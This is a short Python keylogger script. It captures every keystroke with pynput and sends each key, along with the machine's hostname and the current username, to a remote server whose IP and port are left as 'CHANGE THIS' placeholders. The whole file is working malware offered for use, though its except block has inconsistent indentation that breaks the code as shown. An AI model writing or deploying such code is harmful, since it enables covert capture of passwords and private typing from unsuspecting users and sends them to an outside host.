from pynput.keyboard import Key, Listener
import socket
import getpass

server_ip = "x.x.x.x" #CHANGE THIS
server_port = 2323 #CHANGE THIS
client_socket = socket.socket()
client_socket.connect((server_ip, server_port))

def on_press(key):
    message = socket.gethostname() + "&?"+ getpass.getuser() + "&?" + str(key)
    try:
      client_socket.send(message.encode())
     except:
       client_socket.close()
      quit()

with Listener(on_press=on_press) as listener:
    listener.join()
